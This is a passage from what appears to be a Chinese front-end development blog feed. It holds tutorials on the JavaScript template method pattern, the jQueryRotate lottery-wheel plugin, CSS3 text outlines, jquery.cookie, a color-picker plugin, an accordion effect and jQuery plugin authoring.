Bevarage();接下来要重写抽象父类中的一些方法，只有“把水煮沸”这个行为可以直接使用父类Beverage中的boilWater方法，其他方法都需要在Coffee子类中重写，代码如下：123456789101112Coffee.prototype.brew = function()&#123;console.log('用沸水冲泡咖啡');&#125;;Coffee.prototype.pourInCup = function()&#123;console.log('把咖啡倒进杯子');&#125;;Coffee.prototype.addCondiments = function()&#123;console.log('加糖和牛奶');&#125;;var coffee = new Coffee();coffee.init();至此我们的Coffee类已经完成了，当调用coffee对象的init方法时，由于coffee对象和Coffee构造器的原型prototype上都没有对应的init方法，所以该请求会顺着原型链，被委托给Coffee的“父类”Beverage原型上的init方法。而Beverage.prototype.init方法中已经规定好了泡饮料的顺序，所以我们能成功地泡出一杯咖啡，代码如下：123456Bevarage.prototype.init = function()&#123;this.boilWater();this.brew();this.pourInCup();this.addCondiments();&#125;;接下来照葫芦画瓢，来创建我们的Tea类：123456789101112131415var Tea = function()&#123;&#125;;Tea.prototype = new Bevarage();Tea.prototype.brew = function()&#123;console.log('用沸水㓎泡茶叶');&#125;;Tea.prototype.pourInCup = function()&#123;console.log('把茶倒进杯子');&#125;;Tea.prototype.addCondiments = function()&#123;console.log('加柠檬');&#125;;var tea = new Tea();tea.init();本章一直讨论的是模板方法模式，那么在上面的例子中，到底谁才是所谓的模板方法呢？答案是 Beverage.prototype.init。Beverage.prototype.init 被称为模板方法的原因是，该方法中封装了子类的算法框架，它作为一个算法的模板，知道子类以何种顺序去执行哪些方法。在 Beverage.prototype.init 方法中，算法的每一个步骤都清楚的展示在我们眼前。3. 抽象类首先要说明的是，模板方法模式是一种严重依赖抽象类的设计模式。 JavaScript在语言层面没有提供对抽象类的支持，我们也很难模拟抽象类的实现。这一节我们将着重讨论 Java 中抽象类的作用，以及 JavaScript 没有抽象类时所做出的让步和变通。3. 1 抽象类的作用在 Java 中，类分为两种，一种为具体类，另一种为抽象类。具体可以被实例化，抽象类不能被实例化。要了解抽象类不能被实例化的原因，我们可以思考“饮料”这个抽象类。想像这样一个场景：我们口渴了，去便利店想买一瓶饮料，我们不能直接跟店员说：“来一瓶饮料。”如果我们这样说了，那么店员接下来肯定会问：“要什么饮料？”饮料只是一个抽象名词，只要当我们真正明确了的饮料类型之后，才能得到一瓶可乐或王老吉。由于抽象类不能被实例化，如果有人编写了一个抽象类，那么这个抽象类一定是用来被某些具体类类继承的。抽象类和接口一样可以用于向上转型，在静态类型语言中，编译器对类型的检查总是一个绕不过的话题与困扰。虽然类型检查可以提高程序的安全性，但繁琐而严格的类型检查也时常会让程序员觉得麻烦。把对象的真正类型隐藏在抽象类或者接口之后，这些对象才可以被互相替换使用。这可以让我们的 Java 程序尽量遵守依赖导致原则。除了用于向上转型，抽象类也可以表示一种契约。继承了这个抽象类的所有子类都将拥有跟抽象类一致的接口方法，抽象类的主要作用就是为它的子类定义这些公共接口。如果我们在子类中删掉了这些方法中的某一个，那么将不能通过编译器的检查，这在某些场景下是非常有用的，比如我们本章讨论的模板方法模式， Beverage 类的 init 方法里规定了冲泡一杯饮料的顺序如下：1234this.boilWater(); //把水煮沸this.brew(); //用水泡原料this.pourInCup(); //把原料倒进杯子this.addCondiments(); //添加调料如果在Coffee子类中没有实现对应的 brew 方法，那么我们百分百得不到一杯咖啡。既然父类规定了子类的方法和执行这些方法的顺序，子类就应该拥有这些方法，并且提供正确的实现。3. 2 抽象方法和具体方法抽象方法被声明在抽象类中，抽象方法并没有具体的实现过程，是一些“哑方法”。比如 Beverage 类中的 brew 方法， pourInCup 方法和 addCondiments 方法，都被声明为抽象方法。当子类继承了这个抽象类时，必须重写父类的抽象方法。除了抽象方法之外，如果每个子类中都有一些同样的具体实现方法，那这些方法也可以选择放在抽象类中，这可以节省代码以达到复用的效果，这些方法叫做具体方法。当代码需要改变时，我们只需要改动抽象类里的具体方法就可以了。比如饮料中的 boilWater 方法，假设冲泡所有的饮料之前，都要先把水煮沸，那我们自然可以把 boilWater 方法放在抽象类 Beverage 中。3. 3 JavaScript没有抽象类的缺点和解决方案JavaScript 并没有从语法层面提供对抽象类的支持。抽象类的第一个作用是隐藏对象的具体类型，由于JavaScript是一门“类型模糊”的语言，所以隐藏对象的类型在 JavaScript 中并不重要。另一方面，当我们在 JavaScript 中使用原型继承来模拟传统的类式继承时，并没有编译器帮助我们进行任何形式的检查，我们也没有办法保证子类会重写父类中的“抽象方法”。我们知道， Beverage.prototype.init 方法作为模板方法，已经规定了子类的算法框架，代码如下：123456Bevarage.prototype.init = function()&#123;this.boilWater();this.brew();this.pourInCup();this.addCondiments();&#125;;如果我们的 Coffee 类或者 Tea 类忘记实现这4个方法中的一个呢？拿 brew 方法举例，如果我们忘记编写 Coffee.prototype.bre w方法，那么当请求 Coffee 对象的 brew 时，请求会顺着原型链找到 Beverage “父类”对应的 Beverage.prototype.brew 方法，而 Beverage.prototype.brew 方法到目前为止是一个空方法，这显然是不能符合我们需要的。在 Java 中编译器会保证子类会重写父类中的抽象方法，但在 JavaScript 中却没有进行这些检查工作。我们在编写代码的时候得不到任何形式的警告，完全寄托于程序员的记忆力和自觉性是很危险的，特别是当我们使用模板方法模式这种完全依赖继承而实现的设计模式时。下面提供两种变通的解决方案。第一种方案是用鸭子类型来模拟接口检查，以便确保子类中确实重写了父类的方法。但模拟接口检查会带来不必要的复杂性，而且要求程序员主动进行这些接口检查，这就要求我们在业务代码中添加一些跟野夫逻辑无关的代码。第二种方案是让 Beverage.prototype.brew 等方法直接抛出一个异常，如果因为粗心忘记编写 Coffee.prototype.brew方法，那么至少我们会在程序运行时得到一个错误：123456789Bevarage.prototype.brew = function()&#123;throw new Error('子类必须重写 brew 方法');&#125;;Bevarage.prototype.pourInCup = function()&#123;throw new Error('子类必须重写 pourIncup 方法');&#125;;Bevarage.prototype.addCondiments = function()&#123;throw new Error('子类必须重写 addCondiments方法 ');&#125;;第二种解决方案的有点是实现简单，付出的额外代价很少；缺点是我们得到错误信息的时间点太靠后。我们一共有 3 次机会得到这个错误信息，第 1 次是在编写代码的时候，通过编译器的检查来得到错误信息；第 2 次是在创建对象的时候用鸭子类型来进行“接口检查”；而目前我们不得不利用最后一次机会，在程序运行过程中才知道哪里发生了错误。4. 模板方法的使用场景从大的方面来讲，模板方法模式常被架构师用于搭建项目的框架，架构师定好了框架的骨架，程序员继承架构的结构之后，负责往里面填空，比如 Java 程序员大多使用过 HttpServlet 技术来开发项目。在 Web 开发中也能找到很多模板方法模式的适用场景，比如我们在构建一系列的UI组件，这些组件的构建过程一般如下所示：1、初始化一个 div 容器2、通过 ajax 请求拉取相应的数据3、把数据渲染到 div 容器里面，完成组件的构造4、通知用户组件渲染完毕我们看到，任何组件的构建都遵循上面的 4 步，其中第 1 步和第 4 步是相同的。第 2 步不同的地方只是请求 ajax 的远程地址，第 3 步不同的地方是渲染数据的方式。于是我们可以把这4个步骤都抽象到父类的模板方法里面，父类中还可以顺便提供第 1 步和第 4 步的具体实现。当子类继承这个父类之后，会重写模板方法里面的第 2 步 和第 3 步。5. 钩子方法通过模板方法模式，我们在父类中封装了子类的算法框架。这些算法框架在正常状态下是适用于大多数子类的，但如果有一些特别“个性”的子类呢？比如我们在饮料类 Beverage 中封装了饮料的冲泡顺序：1、把水煮沸2、用沸水冲泡饮料3、把饮料倒进杯子4、加调料这 4 个冲泡饮料的步骤适用于咖啡和茶，在我们的饮料店里，根据这 4 个步骤制作出来的咖啡和茶，一直顺利地提供给大部分客人享用。但有一些客人喝咖啡是不加调料（糖和牛奶）的。既然 Beverage 作为父类，已经规定好了冲泡饮料的 4 个步骤，那么有什么办法可以让子类不受这个约束呢？钩子方法（hook）可以用来解决这个问题，放置钩子是隔离变化的一种常见手段。我们在父类中容易变化的地方放置钩子，钩子可以有一个默认的实现，究竟要不要“挂钩”，这由子类自行决定。钩子方法的返回结果决定了模板方法后面部分的执行步骤，也就是程序接下来的走向，这样一来，程序就拥有了变化的可能。在这个例子里，我们把挂钩的名字定为 customerWantsCondiments ，接下来将挂钩放入 Beverage 类，看看我们如何得到一杯不需要糖和牛奶的咖啡，代码如下：12345678910111213141516171819202122232425262728293031323334353637383940414243var Bevarage = function()&#123;&#125;;Bevarage.prototype.boilWater = function()&#123;console.log('把水煮沸');&#125;;Bevarage.prototype.brew = function()&#123;throw new Error('子类必须重写 brew 方法');&#125;;Bevarage.prototype.pourInCup = function()&#123;throw new Error('子类必须重写 pourIncup 方法');&#125;;Bevarage.prototype.addCondiments = function()&#123;throw new Error('子类必须重写 addCondiments方法 ');&#125;;Bevarage.prototype.customerWantscondiments = function()&#123;return true; //默认为需要加入调料&#125;;Bevarage.prototype.init = function()&#123;this.boilWater();this.brew();this.pourInCup();if(this.customerWantscondiments())&#123; //如果挂钩返回 true ，则需要调料this.addCondiments();&#125;&#125;;var Coffee = function()&#123;&#125;;Coffee.prototype = new Bevarage();Coffee.prototype.brew = function()&#123;console.log('用沸水冲泡咖啡');&#125;;Coffee.prototype.pourInCup = function()&#123;console.log('把咖啡倒进杯子');&#125;;Coffee.prototype.addCondiments = function()&#123;console.log('加糖和牛奶');&#125;;Coffee.prototype.customerWantscondiments = function()&#123;return window.confirm('请问需要调料吗？');&#125;var coffeeWithHook = new Coffee();coffeeWithHook.init();6. 好莱坞原则学习完模板方法之后，我们要引入一个新的设计原则——著名的“好莱坞原则”。好莱坞无疑是演员的天堂，但好莱坞也有很多找不到工作的新人演员，许多新人演员在好莱坞把简历递给演艺公司之后就只有回家等待电话。有时候该演员等得不赖烦了，给演艺公司打电话询问情况，演艺公司往往这样回答：“不要来找我，我会给你打电话。”在设计中，这样的规则就称为好莱坞原则。在这一原则的指导下，我们允许底层组件将自己挂钩到高层组件中，而高层组件会决定什么时候，以何种方式去使用这些底层组件，高层组件对待底层组件的方式，跟演艺公司对待新人演员一样，都是“别调用我们，我们会调用你”。模板方法模式是最好的一个典型使用场景，它与好莱坞原则的联系非常明显，当我们用模板方法模式编写一个程序时，就意味着子类放弃了对自己的控制权，而是改为父类通知子类，哪些方法应该在什么时候被调用。作为子类，只负责一些设计上的细节。除此之外，好莱坞原则还常常应用于其他模式和场景，例如发布——订阅模式和回调函数。发布——订阅模式在发布——订阅模式中，发布者会把消息推送给订阅者，这取代了原先不断去 fetch 消息的形式。例如假设我们乘坐出租车去一个不了解的地方，除了没过 5 秒钟就问司机“是否到达目的地”之外，还可以在车上美美的睡上一觉，然后跟司机说好，等目的地到了就叫醒你。这也相当于好莱坞原则中提到的“别调用我们，我们会调用你”。回调函数在 ajax 异步请求中，由于不知道请求返回的具体时间，而通过轮询去判断是否返回数据，这显然是不理智的行为。所以我们通常会把接下来的操作放在回调函数中，传入发起 ajax 异步请求的函数。当数据返回之后，这个回调函数才被执行，这也是好莱坞原则的一种体现。把需要执行的操作封装在回调函数里，然后把主动权交给另外一个函数。至于回调函数什么时候被执行，则是另外一个函数控制的。7. 真的需要“继承”吗模板方法模式是基于继承的一种设计模式，父类封装了子类的算法框架和方法的执行顺序，子类继承父类之后，父类通知子类执行这些方法，好莱坞原则很好的诠释了这种设计技巧，即高层组件调用底层组件。本章我们通过模板方法模式，编写了一个 Coffee or Tea 的例子。模板方法模式是为数不多的基于继承的设计模式，当JavaScript语言实际上没有提供真正的类式继承，继承是通过对象与对象之间的委托来实现的。也就是说，虽然我们在形式上借鉴了提供类式继承的语言，但本章学习到的模板放法模式并不十分正宗。而且在JavaScript这般灵活的语言中，实现这样一个例子，是否真的需要继承这种重武器呢？在好莱坞原则的指导之下，下面这段代码可以达到和继承一样的效果。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455var Beverage = function (param) &#123; var boilWater = function () &#123; console.log('把水煮沸'); &#125;; var brew = param.brew || function () &#123; throw new Error('必须传递 brew 方法'); &#125;; var pourInCup = param.pourInCup || function () &#123; throw new Error('必须传递 pourInCup 方法'); &#125;; var addCondiments = param.addCondiments || function () &#123; throw new Error('必须传递 addCondiments 方法'); &#125;; var F = function()&#123;&#125;; F.prototype.init = function () &#123; boilWater(); brew(); pourInCup(); addCondiments(); &#125; return F;&#125;var Coffee = Beverage(&#123; brew: function () &#123; console.log('用沸水冲泡咖啡'); &#125;, pourInCup: function () &#123; console.log('把咖啡倒进杯子'); &#125;, addCondiments: function () &#123; console.log('加糖和牛奶') &#125;&#125;);var Tea = Beverage(&#123; brew: function () &#123; console.log('用沸水㓎泡茶叶'); &#125;, pourInCup: function () &#123; console.log('把茶倒进杯子'); &#125;, addCondiments: function () &#123; console.log('加柠檬') &#125;&#125;);var coffee = new Coffee();coffee.init();var tea = new Tea();tea.init();在这段代码中，我们把 brew，pourInCup，addCondiments，这些方法依次传入 Beverage 函数， Beverage 函数被调用之后返回构造器 F 。 F 类中包含了“模板方法” F.prototype.init 。跟继承得到的效果是一样，该“模板方法”里依然封装了饮料子类的算法框架。8. 小结模板方法模式是一种典型的通过封装变化提高系统扩展性的设计模式。在传统的面向对象语言中，一个运用了模板方法莫斯的程序中，子类的方法种类和执行顺序都是不变的，所以我们把这部分逻辑抽象到父类的模板方法里面。而子类的方法具体怎么实现则是可变的，于是我们把这部分变化的逻辑封装到子类中。通过增加新的子类，我们便能给系统增加新的功能，并不需要改动抽象父类以及其他子类，这也是符合开发——封闭原则的。但在 JavaScript中，我们很多时候都不需要依样画瓢地去实现一个模板方法模式，高阶函数是更好的选择。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>javascript中模板方法模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[抽奖转盘插件-jqueryrotate.js使用实例及demo下载]]></title>
    <url>%2F2015%2F10%2F19%2F%E6%8A%BD%E5%A5%96%E8%BD%AC%E7%9B%98%E6%8F%92%E4%BB%B6-jqueryrotate-js%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B%E5%8F%8Ademo%E4%B8%8B%E8%BD%BD%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;很多公司到了年底都会做一些抽奖活动来刺激、吸引、粘住客户，比如抽奖转盘活动。前几天用一个jqueryRotate插件实现了转盘的效果。比起那些很炫丽的flash是稍逊点，但也基本实现了需求实现这个其实蛮简单的，转动的效果用的jqueryRotate插件，所以只要判断每个奖荐对应的角度，然后设置指针的转动角度就可以了。比如关键的是jqueryRotate这个插件的用法。&emsp;&emsp;jqueryRotate的资料：支持Internet Explorer 6.0+ 、Firefox 2.0 、Safari 3 、Opera 9 、Google Chrome，高级浏览器下使用Transform，低版本ie使用VML实现google code地址：http://code.google.com/p/jqueryrotate/调用和方法：12345678910111213$(el).rotate(&#123; angle:0, //起始角度 animateTo:180, //结束的角度 duration:500， //转动时间 callback:function()&#123;&#125;, //回调函数 easing: $.easing.easeInOutExpo //定义运动的效果，需要引用jquery.easing.min.js的文件 &#125;)$(el).rotate(45); //直接这样子调用的话就是变换角度$(el).getRotateAngle(); //返回对象当前的角度$(el).stopRotare(); //停止旋转动画另外可以更方便的通过调用$(el).rotateRight()和$(el).rotateLeft()来分别向右旋转90度和向左旋转90度。rotate(angle)angle参数：[Number] – 默认为 0 – 根据给定的角度旋转图片例如:1$("#img").rotate(45);rotate(parameters)parameters参数：[Object] 包含旋转参数的对象。支持的属性:1、angle属性：[Number] – default 0 – 旋转的角度数，并且立即执行例如:$(“#img”).rotate({angle:45});2、bind属性：[Object] 对象，包含绑定到一个旋转对象的事件。事件内部的$(this)指向旋转对象-这样你可以在内部链式调用- $(this).rotate(…)。例如 (click on arrow):12345678910$("#img").rotate(&#123; bind: &#123; click: function () &#123; $(this).rotate(&#123; angle: 0, animateTo: 180 &#125;) &#125; &#125;&#125;);3、animateTo属性：[Number] – default 0 – 从当前角度值动画旋转到给定的角度值 （或给定的角度参数）例如: 结合上面的例子，请参阅使用。4、duration属性：[Number] – 指定使用animateTo的动画执行持续时间例如 (click on arrow):1234567891011$("#img").rotate(&#123; bind: &#123; click: function () &#123; $(this).rotate(&#123; duration: 6000, angle: 0, animateTo: 100 &#125;) &#125; &#125;&#125;);5、step属性：[Function] – 每个动画步骤中执行的回调函数，当前角度值作为该函数的第一个参数6、easing属性：[Function] – 默认 (see below) – Easing function used to make animation look more natural. It takes five parameters (x,t,b,c,d) to support easing from http://gsgd.co.uk/sandbox/jquery/easing/ (for more details please see documentation at their website). Remember to include easing plugin before using it in jQueryRotate!Default function:1function (x, t, b, c, d) &#123; return -c * ((t=t/d-1)*t*t*t - 1) + b; &#125;Where:t: current time,b: begInnIng value,c: change In value,d: duration,x: unusedNo easing (linear easing):1function(x, t, b, c, d) &#123; return (t/d)*c ; &#125;Example (click on arrow):&#123;123456789 click: function () &#123; $(this).rotate(&#123; angle: 0, animateTo: 180, easing: $.easing.easeInOutElastic &#125;) &#125;&#125;&#125;);7、callback属性：[Function] 动画完成时执行的回调函数例如 (click on arrow):12345678910111213$("#img").rotate(&#123;bind: &#123; click: function () &#123; $(this).rotate(&#123; angle: 0, animateTo: 180, callback: function () &#123; alert(1) &#125; &#125;) &#125;&#125;&#125;);getRotateAngle这个函数只是简单地返回旋转对象当前的角度。例如:12345678$("#img").rotate(&#123; angle: 45, bind: &#123; click: function () &#123; alert($(this).getRotateAngle()); &#125; &#125;&#125;);stopRotate这个函数只是简单地停止正在进行的旋转动画。例如:1234567891011121314$("#img").rotate(&#123; bind: &#123; click: function () &#123; $("#img").rotate(&#123; angle: 0, animateTo: 180, duration: 6000 &#125;); setTimeout(function () &#123; $("#img").stopRotate(); &#125;, 1000); &#125; &#125;&#125;);用这个可以实现很多关于旋转的网页特效，我用这个做了个抽奖大转盘，效果不错，就是没flash顺畅，基本能跑哈哈。最后分享一下最终的一个demo的效果图及代码：效果图：代码(基于ajax来开发抽奖的，需要在服务端去运行)：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;!DOCTYPE&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;title&gt;转盘&lt;a href="http://www.suchso.com/UIweb/jquery-fangtaobao-choujiang-zhuanpan-demo.html" class="keylink" title=" 抽奖" target="_blank"&gt;抽奖&lt;/a&gt;&lt;/title&gt;&lt;script src="js/jquery-1.11.0.min.js"&gt;&lt;/script&gt;&lt;script src="js/Rotate.js"&gt;&lt;/script&gt;&lt;style&gt;*&#123;padding:0; margin:0;&#125;.lotteryMain&#123; width:100%; padding:20px 0; &#125;.lotteryBg&#123; width:520px; height:520px; margin:0 auto; background:url(images/lotteryBg.jpg) no-repeat; position:relative; overflow:hidden;&#125;#run&#123; width:153px; height:214px; position:absolute; left:50%; top:50%; margin-left:-76px; margin-top:-107px; z-index:1; transform:rotate(0deg); -ms-transform:rotate(0deg); &#125;#btn_run&#123; width:125px; height:125px; background:url(images/btn_start.png) no-repeat; border:none; outline:none; position:absolute; left:50%; top:50%; margin-left:-62px; margin-top:-62px; z-index:2;cursor:pointer;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;section class="lotteryMain"&gt;&lt;div class="lotteryBg"&gt;&lt;img id="run" src="images/start.png" /&gt;&lt;input id="btn_run" type="button" value="" /&gt;&lt;/div&gt;&lt;div id="results"&gt;&lt;/div&gt;&lt;/section&gt;&lt;script&gt;$(function()&#123;$("#btn_run").click(function()&#123;$("#btn_run").attr('disabled',true).css("cursor","default");lottery();&#125;);&#125;);function lottery()&#123;$.ajax(&#123;type: 'get',url: 'json2.js',dataType: 'json',cache: false,error: function()&#123;return false;&#125;,success:function(obj)&#123;$("#run").rotate(&#123;duration:3000, //转动时间angle: 0, //默认角度animateTo:360*6+obj.rotate, //转动角度easing: $.easing.easeOutSine,callback: function()&#123;alert(obj.results);$("#btn_run").attr('disabled',false).css("cursor","pointer");&#125;&#125;);&#125;&#125;);&#125;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jqueryrotate.js</tag>
        <tag>抽奖 rotate.js</tag>
        <tag>抽奖转盘插件 rotate.js</tag>
        <tag>旋转插件 rotate.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS3文字描边 CSS3字体外部描边]]></title>
    <url>%2F2015%2F10%2F14%2Fcss3%E6%96%87%E5%AD%97%E6%8F%8F%E8%BE%B9-css3%E5%AD%97%E4%BD%93%E5%A4%96%E9%83%A8%E6%8F%8F%E8%BE%B9%2F</url>
    <content type="text"><![CDATA[给需要实现文字描边的元素添加如下CSS3的属性1234567text-shadow:#000 1px 0 0,#000 0 1px 0,#000 -1px 0 0,#000 0 -1px 0;-webkit-text-shadow:#000 1px 0 0,#000 0 1px 0,#000 -1px 0 0,#000 0 -1px 0;-moz-text-shadow:#000 1px 0 0,#000 0 1px 0,#000 -1px 0 0,#000 0 -1px 0;*filter: Glow(color=#000, strength=1);语法详解：text-shadow:向文本设置阴影。text-shadow:color||length||length||opacity。color:指定颜色。length:第一个length指定阴影在水平方向上的延伸距离，第二个length指定阴影在垂直方向上的延伸距离，可以为负值。opacity:指定阴影模糊效果的作用距离。用逗号分隔的4个属性值代表的方向顺序为右下左上。为了兼容多浏览器而加上前缀-webkit-和-moz-。&nbsp;filter:滤镜。filter:Glow 添加光辉晕圈效果在元素对象的边外。filter:Glow（color=颜色值，strength=数值）。color:指定晕圈发光效果的颜色。strength:指定晕圈发光的强度范围，参数值从1到255。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>CSS3文字描边</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cookie插件jquery.cookie.js]]></title>
    <url>%2F2015%2F10%2F09%2Fcookie%E6%8F%92%E4%BB%B6jquery-cookie-js%2F</url>
    <content type="text"><![CDATA[Cookie是网站设计者放置在客户端的小文本文件。Cookie能为用户提供很多的使得，例如购物网站存储用户曾经浏览过的产品列表，或者门户网站记住用户喜欢选择浏览哪类新闻。 在用户允许的情况下，还可以存储用户的登录信息，使得用户在访问网站时不必每次都键入这些信息Cookie下载地址：http://plugins.jquery.com/project/cookie使用方法：1.引入jquery.cookie.js12&lt;script src="scripts/jquery.js" type="text/javascript"&gt;&lt;/script&gt;&lt;script src="scripts/jquery.cookie.js" type="text/javascript"&gt;&lt;/script&gt;2.使用方法1).新添加一个会话 cookie：$.cookie(‘the_cookie’, ‘the_value’);注：当没有指明 cookie有效时间时，所创建的cookie有效期默认到用户关闭浏览器为止，所以被称为“会话cookie（session cookie）”。2).创建一个cookie并设置有效时间为 7天:$.cookie(‘the_cookie’, ‘the_value’, { expires: 7 });注：当指明了cookie有效时间时，所创建的cookie被称为“持久 cookie （persistent cookie）”。3).创建一个cookie并设置 cookie的有效路径：$.cookie(‘the_cookie’, ‘the_value’, { expires: 7, path: ‘/‘ });注：在默认情况下，只有设置 cookie的网页才能读取该 cookie。如果想让一个页面读取另一个页面设置的cookie，必须设置cookie的路径。cookie的路径用于设置能够读取 cookie的顶级目录。将这个路径设置为网站的根目录，可以让所有网页都能互相读取 cookie （一般不要这样设置，防止出现冲突） 。4).读取cookie：$.cookie(‘the_cookie’); // cookie存在 =&gt; ‘the_value’$.cookie(‘not_existing’); // cookie不存在 =&gt; null5).删除cookie，通过传递null作为cookie的值即可：$.cookie(‘the_cookie’, null);3.将cookie写入文件1234567891011121314var COOKIE_NAME = 'username'; if( $.cookie(COOKIE_NAME) )&#123; $("#username").val( $.cookie(COOKIE_NAME) ); &#125; $("#check").click(function()&#123; if(this.checked)&#123; $.cookie(COOKIE_NAME, $("#username").val() , &#123; path: '/', expires: 10, domain: 'jquery.com', secure: true &#125;); //var date = new Date(); //date.setTime(date.getTime() + (3 * 24 * 60 * 60 * 1000)); //三天后的这个时候过期 //$.cookie(COOKIE_NAME, $("#username").val(), &#123; path: '/', expires: date &#125;); &#125;else&#123; $.cookie(COOKIE_NAME, null, &#123; path: '/' &#125;); //删除cookie &#125; &#125;);参数设置：expires: (Number | Date)有效期，可以设置一个整数作为有效期（单位：天），也可以设置一个日期对象作为Cookie的过期日期。如果指定日期为负数，那么此cookie将被删除；如果不设置或者设置为null，那么此cookie将被当作Session Cookie处理，并且在浏览器关闭后删除path: (String) Cookie的路径属性，默认是创建该cookie的页面路径domain: (String) Cookie的域名属性，默认是创建该cookie的页面域名secure: (Boolean) 如果设为true，那么此cookie的传输会要求一个安全协议，例如HTTPS]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>Cookie插件</tag>
        <tag>jquery.cookie.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery颜色选择器拾色器插件iColor]]></title>
    <url>%2F2015%2F10%2F08%2Fjquery%E9%A2%9C%E8%89%B2%E9%80%89%E6%8B%A9%E5%99%A8%E6%8B%BE%E8%89%B2%E5%99%A8%E6%8F%92%E4%BB%B6icolor%2F</url>
    <content type="text"><![CDATA[用法简介：jquery颜色选择器拾色器插件iColor。文件引用：123456789101112131415161718192021222324252627282930&lt;script type="text/javascript" src="js/jquery-1.9.1.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/iColor-min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;$(function() &#123;$('input').iColor(&#123;'x': 10, 'y': -50&#125;);$('#lineColor').iColor(function(hx) &#123;console.log('自定义回调：去掉内容');this.val('').css('background', '#' + hx);&#125;);$('#color').iColor(function(hx) &#123;console.log('自定义回调：我不修改背景色');this.val('#' + hx)&#125;);$('#mycolor2').iColor();$('[name="mousecolor"]').iColor(&#123;'type': 'mouseover','open': function(e) &#123;var color = this.data('color');console.log('事件类型' + e.type);console.log(color ? '之前设置的颜色为：' + color : '之前没有设置颜色');&#125;,'set': function(hx) &#123;this.data('color', '#'+hx);this.val('').css('background', '#' + hx);console.log('现在设置的颜色为：' + '#'+hx);&#125;&#125;);&#125;);&lt;/script&gt;查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>颜色选择器拾色器 iColor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery全屏手风琴效果]]></title>
    <url>%2F2015%2F10%2F08%2Fjquery%E5%85%A8%E5%B1%8F%E6%89%8B%E9%A3%8E%E7%90%B4%E6%95%88%E6%9E%9C%2F</url>
    <content type="text"><![CDATA[用法简介：jQuery全屏手风琴效果。文件引用：1234567891011121314151617181920212223242526272829303132333435363738&lt;script src="js/jquery-1.8.3.min.js" type="text/javascript"&gt;&lt;/script&gt;&lt;script&gt;var Expand = function () &#123; var tile = $('.strips__strip'); var tileLink = $('.strips__strip &gt; .strip__content'); var tileText = tileLink.find('.strip__inner-text'); var stripClose = $('.strip__close'); var expanded = false; var open = function () &#123; var tile = $(this).parent(); if (!expanded) &#123; tile.addClass('strips__strip--expanded'); tileText.css('transition', 'all .6s 1s cubic-bezier(0.23, 1, 0.32, 1)'); stripClose.addClass('strip__close--show'); stripClose.css('transition', 'all .6s 1s cubic-bezier(0.23, 1, 0.32, 1)'); expanded = true; &#125; &#125;; var close = function () &#123; if (expanded) &#123; tile.removeClass('strips__strip--expanded'); tileText.css('transition', 'all 0.15s 0 cubic-bezier(0.23, 1, 0.32, 1)'); stripClose.removeClass('strip__close--show'); stripClose.css('transition', 'all 0.2s 0s cubic-bezier(0.23, 1, 0.32, 1)'); expanded = false; &#125; &#125;; var bindActions = function () &#123; tileLink.on('click', open); stripClose.on('click', close); &#125;; var init = function () &#123; bindActions(); &#125;; return &#123; init: init &#125;;&#125;();Expand.init();&lt;/script&gt;查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jQuery全屏手风琴效果</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何开发一款自己的js或者jquery插件]]></title>
    <url>%2F2015%2F10%2F08%2F%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E4%B8%80%E6%AC%BE%E8%87%AA%E5%B7%B1%E7%9A%84js%E6%88%96%E8%80%85jquery%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[引子&emsp;&emsp;现在网上关于js和jquery封装的插件很多，我刚刚接触前端的时候，就很敬佩那些自己写插件的大牛们！因为是他们给网站开发更多的便利，很多网页效果，网上很多现成的插件！那么这些插件是如何写的呢？首先是有扎实的js和jquery技术基础，其次还有一些写插件的方法和技巧。关于js和jquery的技术基础，那是一个慢慢积累的过程。但是关于写插件的一些注意和技巧，本文可以略微介绍一下，方便以后写插件的时候用得到。jquery插件开发模式jquery插件一般有三种开发方式：通过$.extend()来扩展jQuery通过$.fn 向jQuery添加新的方法通过$.widget()应用jQuery UI的部件工厂方式创建&emsp;&emsp;第一种$.extend()相对简单，一般很少能够独立开发复杂插件，第三种是一种高级的开发模式，本文也不做介绍。第二种则是一般插件开发用到的方式，本文着重讲讲第二种。插件开发第二种插件开发方式一般是如下定义123$.fn.pluginName = function() &#123;//your code here&#125;插件开发，我们一般运用面向对象的思维方式例如定义一个对象12345678910111213141516171819var Haorooms= function(el, opt) &#123;this.$element = el,this.defaults = &#123;'color': 'red','fontSize': '12px','textDecoration':'none'&#125;,this.options = $.extend(&#123;&#125;, this.defaults, opt)&#125;//定义haorooms的方法haorooms.prototype = &#123;changecss: function() &#123;return this.$element.css(&#123;'color': this.options.color,'fontSize': this.options.fontSize,'textDecoration': this.options.textDecoration&#125;);&#125;&#125;&emsp;&emsp;$.extend({}, this.defaults, opt)有{}主要是为了创建一个新对象，保留对象的默认值。123456$.fn.myPlugin = function(options) &#123; //创建haorooms的实体 var haorooms= new Haorooms(this, options); //调用其方法 return Haorooms.changecss();&#125;调用这个插件直接如下就可以123456$(function() &#123; $('a').myPlugin(&#123; 'color': '#2C9929', 'fontSize': '20px' 